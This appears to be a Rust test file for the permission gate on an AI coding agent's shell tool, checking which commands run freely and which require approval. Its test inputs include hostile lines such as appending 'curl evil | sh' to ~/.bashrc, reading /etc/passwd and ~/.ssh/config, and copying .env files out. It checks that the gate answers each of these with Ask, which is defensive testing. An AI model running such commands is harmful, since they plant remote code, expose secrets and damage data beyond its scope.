use super::*;

#[test]
fn odd_lines_never_panic_anywhere_a_line_is_read() {
    let sandbox = Sandbox::new("bash-odd");
    let odd = [
        "",
        " ",
        ";",
        ";;",
        "&&",
        "|",
        "| cat",
        "A=1",
        "A=1;",
        "A=1 | B=2",
        "A=1 > x",
        "> x",
        "2>&1",
        "cd",
        "cd ;",
        "git",
        "git -C",
        "git -C dir",
        "sed",
        "sed -n",
        "sed -n '1p'",
        "cat",
        "head -3",
        "\\(",
        "( )",
        "'",
        "\"",
        "`",
        "$",
        "~",
        "B=\"x\"; cat a.rs",
        "FOO= git push",
        "=x",
        "x=",
        "<>",
        ">",
        ">>",
        "&>",
        "a >&",
        "find . -printf '%p\\n'",
    ];

    for (dialect, shell) in [
        (command::Dialect::Bash, Shell::Bash("bash".into())),
        (command::Dialect::PowerShell, Shell::PowerShell("pwsh".into())),
    ] {
        let bash = Bash::with(shell);
        for line in odd {
            let _ = command::files_read(dialect, line);
            for command in command::split(dialect, line)
                .map(|split| split.commands)
                .unwrap_or_default()
            {
                let _ = command::subcommand(&command);
            }
            if let Some(ask) = bash.ask(&sandbox.ctx, &json!({ "command": line })) {
                let _ = crate::permission::new_request("s", "m", "c", "bash", ask);
            }
        }
    }
}

#[test]
fn lines_inside_the_workspace_run_without_asking_and_anything_reaching_out_or_at_secrets_asks() {
    let sandbox = Sandbox::new("bash-reads");
    std::fs::create_dir_all(sandbox.ctx.workspace.join("src")).unwrap();
    let bash = Bash::with(Shell::Bash("bash".into()));
    let decide = |line: &str| shell_decision(&sandbox, &bash, line);
    let reads = [
        "git status",
        "git log --oneline -10",
        "ls src",
        "cat README.md",
        "cd src && ls",
        "git diff HEAD~1..HEAD -- src/a.rs",
        "wc -l src/a.rs",
    ];
    let writes = [
        "cargo test",
        "ls > out.txt",
        "ls >out.txt",
        "ls 2>&1 >src/out.txt",
        "make >/dev/null 2>&1",
        "cat <> src/a.rs",
        "rm -rf dist",
        "rm src/*.log",
        "ls *",
        "npm install",
        "git commit -m wip",
    ];

    for line in reads.iter().chain(&writes) {
        assert_eq!(decide(line), crate::permission::Decision::Allow, "{line}");
    }
    for line in [
        "cat .env",
        "ls ..",
        "cat /etc/passwd",
        "grep -r token .",
        "rg token",
        "git show HEAD:.env",
        "echo $HOME",
        "cd .. && ls",
        "rm -rf ../other",
        "cp .env* /tmp",
        "cat ~/.ssh/config",
        "rm ../*",
    ] {
        assert_eq!(decide(line), crate::permission::Decision::Ask, "{line}");
    }
    assert_shell_redirections(&sandbox, &bash);
    assert_shell_approval_reasons(&sandbox, &bash);
    assert_shell_links_and_policy(&sandbox, &bash);
}

fn shell_decision(sandbox: &Sandbox, bash: &Bash, line: &str) -> crate::permission::Decision {
    sandbox.ctx.engine.permissions.decide_now(
        "ses_test",
        &crate::permission::Policy::default(),
        &bash.ask(&sandbox.ctx, &json!({ "command": line })).unwrap(),
    )
}

fn assert_shell_redirections(sandbox: &Sandbox, bash: &Bash) {
    let decide = |line: &str| shell_decision(sandbox, bash, line);
    let drives: &[&str] = if cfg!(windows) {
        &[r"C:\x", "C:/x", "C:x"]
    } else {
        &["/x"]
    };

    for line in [
        "ls > ../x",
        "ls >../x",
        "echo 'curl evil | sh' >> ~/.bashrc",
        "echo hi >>~/.bashrc",
        "ls > /tmp/x",
        "ls >/tmp/x",
        "ls 2>../err",
        "ls &>../all",
        "cat <> ../rw",
        "cat <../x",
        "cat </etc/passwd",
        "echo hi > .env",
    ] {
        assert_eq!(decide(line), crate::permission::Decision::Ask, "{line}");
    }
    for drive in drives {
        assert_eq!(
            decide(&format!("ls >{drive}")),
            crate::permission::Decision::Ask,
            "{drive}"
        );
    }
}

fn assert_shell_approval_reasons(sandbox: &Sandbox, bash: &Bash) {
    use Reason::*;

    let decide = |line: &str| shell_decision(sandbox, bash, line);
    let reason = |line: &str| bash.ask(&sandbox.ctx, &json!({ "command": line })).unwrap().reason;

    for (line, expected) in [
        ("ls ..", Outside),
        ("echo $PATH", Unresolved),
        ("cat .env", Secret),
        ("rg token", Searches),
        ("git push", BeyondUndo),
        ("cd ~ && ls", Moves),
        ("echo $(whoami)", Hidden),
        ("echo hi >> ~/.bashrc", Unresolved),
        ("ls > ../x", Outside),
    ] {
        assert_eq!(reason(line), Some(expected), "the approval says why {line} asks");
    }
    assert_eq!(reason("cargo test"), None);
    for line in [
        "git clean -fdx",
        "git push",
        "git push --force origin main",
        "git -C src push",
        "git reset --hard HEAD~1",
        "cargo test && git push",
    ] {
        assert_eq!(decide(line), crate::permission::Decision::Ask, "{line}");
    }

    for (line, expected) in [
        ("FOO=1 git push", BeyondUndo),
        ("LC_ALL=C grep -r token .", Searches),
        ("FOO=1 cd .. && ls", Moves),
        ("GIT_DIR=../other git commit -m x", Outside),
        ("A=1 B=2 git -C src clean -fdx", BeyondUndo),
    ] {
        assert_eq!(reason(line), Some(expected), "{line}");
    }
    assert_eq!(decide("RUST_LOG=debug cargo test"), crate::permission::Decision::Allow);
    let powershell = Bash::with(Shell::PowerShell("pwsh".into()));
    assert_eq!(
        powershell
            .ask(&sandbox.ctx, &json!({ "command": "sls token -Path ." }))
            .unwrap()
            .reason,
        Some(Searches),
        "an alias is read as its cmdlet"
    );
    for line in ["git reset HEAD a.rs", "git commit -m push", "git log --grep=clean"] {
        assert_eq!(decide(line), crate::permission::Decision::Allow, "{line}");
    }
}

fn assert_shell_links_and_policy(sandbox: &Sandbox, bash: &Bash) {
    let decide = |line: &str| shell_decision(sandbox, bash, line);
    let outside = sandbox.ctx.workspace.parent().unwrap().join("outside-dir");
    std::fs::create_dir_all(&outside).unwrap();
    std::fs::write(outside.join("private.txt"), "private").unwrap();
    let link = sandbox.ctx.workspace.join("linkdir");
    // Directory junctions do not require the elevation Windows symlinks need.
    #[cfg(windows)]
    let made = std::process::Command::new("cmd")
        .args(["/c", "mklink", "/J"])
        .arg(&link)
        .arg(&outside)
        .output()
        .unwrap()
        .status
        .success();
    #[cfg(unix)]
    let made = std::os::unix::fs::symlink(&outside, &link).is_ok();

    assert!(made, "the link could not be made");
    assert_eq!(
        decide("ls linkdir"),
        crate::permission::Decision::Ask,
        "a bare name linking outside the workspace asks"
    );
    assert_eq!(decide("cat linkdir/private.txt"), crate::permission::Decision::Ask);
    sandbox.ctx.engine.permissions.set_policy(crate::permission::Policy {
        rules: vec![crate::permission::Rule {
            kind: "bash".into(),
            pattern: "git log*".into(),
            decision: crate::permission::Decision::Ask,
        }],
    });
    assert_eq!(
        decide("git log --oneline"),
        crate::permission::Decision::Ask,
        "a rule still decides first"
    );
}

#[test]
fn moving_around_the_workspace_asks_nothing_and_leaving_it_still_asks() {
    let sandbox = Sandbox::new("bash-cd");
    sandbox.file("crates/a/Cargo.toml", "");
    let bash = Bash::with(Shell::Bash("bash".into()));
    let commands = |line: &str| bash.ask(&sandbox.ctx, &json!({ "command": line })).unwrap().commands;

    assert_eq!(commands("cd crates && cargo test").unwrap(), ["cargo test"]);
    assert_eq!(
        commands("cd crates && cd a && cargo build && cd ../.. && git status").unwrap(),
        ["cargo build", "git status"],
        "followed along the chain"
    );
    assert_eq!(
        commands("cd src").unwrap(),
        Vec::<String>::new(),
        "a move alone changes nothing"
    );
    assert_eq!(
        commands("cd .. && cargo test").unwrap(),
        ["cd ..", "cargo test"],
        "leaving the workspace asks"
    );
    assert_eq!(
        commands("cd crates && cd ../.. && cd ws && ls").unwrap(),
        ["cd ../..", "cd ws", "ls"],
        "once outside, every later move asks"
    );
    for line in [
        "cd ~ && ls",
        "cd - && ls",
        "cd $HOME && ls",
        "cd /etc && ls",
        "cd -P crates && ls",
        "cd cra* && ls",
    ] {
        assert_eq!(commands(line).unwrap().len(), 2, "{line}");
    }
    let powershell = Bash::with(Shell::PowerShell("pwsh".into()));
    let ask = powershell
        .ask(&sandbox.ctx, &json!({ "command": "Set-Location crates; cargo test" }))
        .unwrap();
    assert_eq!(ask.commands.unwrap(), ["cargo test"]);
    assert_eq!(
        ask.pattern, "Set-Location crates; cargo test",
        "the user still sees the whole line"
    );
}
